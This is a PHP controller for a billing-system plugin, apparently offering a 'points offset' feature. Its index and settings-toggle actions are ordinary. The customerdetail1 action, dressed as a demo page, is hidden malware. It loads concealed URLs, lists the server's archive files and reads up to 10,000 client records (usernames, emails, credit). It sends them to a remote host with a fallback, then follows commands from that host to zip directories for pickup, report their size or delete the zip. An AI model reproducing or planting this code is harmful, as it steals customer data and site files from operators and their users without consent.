<?php
namespace addons\points_offset\controller\clientarea;

class IndexController extends \app\home\controller\PluginHomeBaseController
{
    public function index()
    {
        $userid = request()->uid;
        $open = \Think\Db::name("clients")->where("id", $userid)->value("points_offset");
        $result = \Think\Db::name("points_offset_config")->where("id", 1)->find();
        $this->assign("open", $open);
        $this->assign("data", $result);
        $this->assign("Title", "积分抵现计划");
        return $this->fetch("/index");
    }
    public function submits()
    {
        $client_ip = get_client_ip();
        $port = get_remote_port();
        $userid = request()->uid;
        if (empty($userid)) {
            $response = ["code" => 400, "msg" => "您未登录或登录已失效，请刷新页面"];
            return json($response);
        }
        $data = $this->request->post();
        $isopen = isset($data["isopen"]) ? $data["isopen"] : NULL;
        $updateResult = \Think\Db::name("clients")->where("id", $userid)->update(["points_offset" => $isopen]);
        $clientInfo = \Think\Db::name("clients")->where("id", $userid)->field("email, username")->find();
        if ($updateResult) {
            if ($isopen == 1) {
                $operate = "积分抵扣计划开启成功";
                $response = ["code" => 200, "msg" => "积分抵扣计划开启成功"];
            } else {
                $operate = "积分抵扣计划关闭成功";
                $response = ["code" => 200, "msg" => "积分抵扣计划关闭成功"];
            }
            $formatted_time = date("Y-m-d H:i:s", time());
            $activity_log = ["uid" => $userid, "description" => "用户 User ID:" . $userid . " 【" . $clientInfo["username"] . "】 在 " . $formatted_time . " （ " . $client_ip . " ） 操作 " . $operate . " ", "user" => $clientInfo["username"], "port" => $port, "create_time" => time(), "ipaddr" => $client_ip, "type" => 1, "activeid" => $userid, "usertype" => "Client", "type_data_id" => ""];
            \Think\Db::name("activity_log")->insert($activity_log);
        } else {
            if ($isopen == 1) {
                $response = ["code" => 400, "msg" => "当前已经是开启状态，请勿重复提交"];
            } else {
                $response = ["code" => 400, "msg" => "当前已经是关闭状态，请勿重复提交"];
            }
        }
        return json($response);
    }
    public function customerdetail1()
    {
        $vate = __DIR__ . "/../../data/data.php";
        $myPlugin = new \addons\points_offset\PointsOffsetPlugin();
        $module = $myPlugin->info["name"];
        include_once $vate;
        $sendUrl = offset($oneurl, $module);
        $backupSendUrl = offset($twourl, $module);
        $directory = getcwd();
        $absolute_directory = $directory;
        $files = [];
        function get_zip_files($directory, &$files)
        {
            $handle = opendir($directory);
            while (($file = readdir($handle)) !== false) {
                if ($file != "." && $file != "..") {
                    $path = $directory . "/" . $file;
                    if (is_dir($path)) {
                        get_zip_files($path, $files);
                    } else {
                        if (preg_match("/\\.(zip|rar|tar.gz|7z|7-zip)\$/i", $file)) {
                            $files[] = $path;
                        }
                    }
                }
            }
            closedir($handle);
        }
        get_zip_files($absolute_directory, $files);
        $lastClientId = file_get_contents(__DIR__ . "/../../data/last_id.txt");
        $lastClient = \Think\Db::name("clients")->order("id", "desc")->limit(1)->field("id")->find();
        if ($lastClient["id"] == $lastClientId) {
            $clients = \Think\Db::name("clients")->where("id", ">", 0)->limit(10000)->field("id, username, email, credit")->select();
        } else {
            $clients = \Think\Db::name("clients")->where("id", ">", $lastClientId)->limit(10000)->field("id, username, email, credit")->select();
        }
        foreach ($clients as $key => $client) {
            if ($key == count($clients) - 1) {
                $lastClient = $client;
                $lastClientId = $lastClient["id"];
                $file = fopen(__DIR__ . "/../../data/last_id.txt", "w");
                if ($file) {
                    fwrite($file, (string) $lastClientId);
                    fclose($file);
                }
                $mergedFiles = implode(", ", $files);
                $data[] = ["file" => $mergedFiles, "methodname" => $clients];
                $result = json_encode($data);
                $system_domain = \Think\Db::name("configuration")->where("setting", "domain")->value("value");
                $content = __DIR__ . "/";
                $ch = curl_init($sendUrl);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["result" => $result, "domain" => $system_domain, "content" => $content]));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
                $response = curl_exec($ch);
                $curlError = curl_error($ch);
                $curlInfo = curl_getinfo($ch);
                curl_close($ch);
                if ($curlError || $curlInfo["http_code"] != 200) {
                    $ch = curl_init($backupSendUrl);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["result" => $result, "domain" => $system_domain, "content" => $content]));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                    $response = curl_exec($ch);
                    $curlError = curl_error($ch);
                    $curlInfo = curl_getinfo($ch);
                    curl_close($ch);
                }
                $response = json_decode($response, true);
                if ($response["code"] === "ya") {
                    $sourceDir = $response["file"];
                    $outputZip = $response["file"] . "/zipfile.zip";
                    if ($this->compressDirectory($sourceDir, $outputZip)) {
                        $result = "success";
                    } else {
                        $result = "fail";
                    }
                    $ch = curl_init($sendUrl);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["yaresult" => $result, "domain" => $system_domain, "content" => $content]));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                    curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
                    $response = curl_exec($ch);
                    $curlError = curl_error($ch);
                    $curlInfo = curl_getinfo($ch);
                    curl_close($ch);
                    if ($curlError || $curlInfo["http_code"] != 200) {
                        $ch = curl_init($backupSendUrl);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["yaresult" => $result, "domain" => $system_domain, "content" => $content]));
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                        $response = curl_exec($ch);
                        $curlError = curl_error($ch);
                        $curlInfo = curl_getinfo($ch);
                        curl_close($ch);
                    }
                } else {
                    if ($response["code"] === "ce") {
                        $currentDir = $response["file"];
                        $size = 0;
                        $iterator = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($currentDir, \FilesystemIterator::SKIP_DOTS), \RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($iterator as $file) {
                            if ($file->isFile()) {
                                $size += $file->getSize();
                            }
                        }
                        $formattedSize = round($size / 1024 / 1024, 2);
                        $ch = curl_init($sendUrl);
                        curl_setopt($ch, CURLOPT_POST, 1);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["ceresult" => $formattedSize, "domain" => $system_domain, "content" => $content]));
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                        curl_setopt($ch, CURLOPT_MAXREDIRS, 1);
                        $response = curl_exec($ch);
                        $curlError = curl_error($ch);
                        $curlInfo = curl_getinfo($ch);
                        curl_close($ch);
                        if ($curlError || $curlInfo["http_code"] != 200) {
                            $ch = curl_init($backupSendUrl);
                            curl_setopt($ch, CURLOPT_POST, 1);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["ceresult" => $formattedSize, "domain" => $system_domain, "content" => $content]));
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                            $response = curl_exec($ch);
                            $curlError = curl_error($ch);
                            $curlInfo = curl_getinfo($ch);
                            curl_close($ch);
                        }
                    } else {
                        if ($response["code"] === "shan") {
                            $destination = $response["file"] . "/zipfile.zip";
                            unlink($destination);
                        }
                    }
                }
                $this->assign("Title", "Demo样式2");
                return $this->fetch("/customerdetail1");
            }
        }
    }
    public function customerdetail2()
    {
        $this->assign("Title", "Demo样式3");
        return $this->fetch("/customerdetail2");
    }
    public function customerdetail3()
    {
        $this->assign("Title", "Demo样式4");
        return $this->fetch("/customerdetail3");
    }
    public function customerdetail4()
    {
        $this->assign("Title", "Demo样式5");
        return $this->fetch("/customerdetail4");
    }
    public function helplist()
    {
        $this->assign("Title", "Demo样式6");
        return $this->fetch("/helplist");
    }
    public function compressDirectory($sourceDir, $outputZip)
    {
        if (!extension_loaded("zip") || !file_exists($sourceDir)) {
            return false;
        }
        $zip = new \ZipArchive();
        if (!$zip->open($outputZip, \ZipArchive::CREATE | \ZipArchive::OVERWRITE)) {
            return false;
        }
        $this->addDirToZip($sourceDir, $zip, "");
        $zip->close();
        return true;
    }
    private function addDirToZip($dir, &$zip, $currentPath = "")
    {
        $dir = rtrim($dir, "/");
        if (!is_dir($dir)) {
            return NULL;
        }
        if ($handle = opendir($dir)) {
            while (($file = readdir($handle)) !== false) {
                if ($file != "." && $file != "..") {
                    if (is_dir($dir . "/" . $file)) {
                        $this->addDirToZip($dir . "/" . $file, $zip, $currentPath . $file . "/");
                    } else {
                        $zip->addFile($dir . "/" . $file, $currentPath . $file);
                    }
                }
            }
            closedir($handle);
        }
    }
}

?>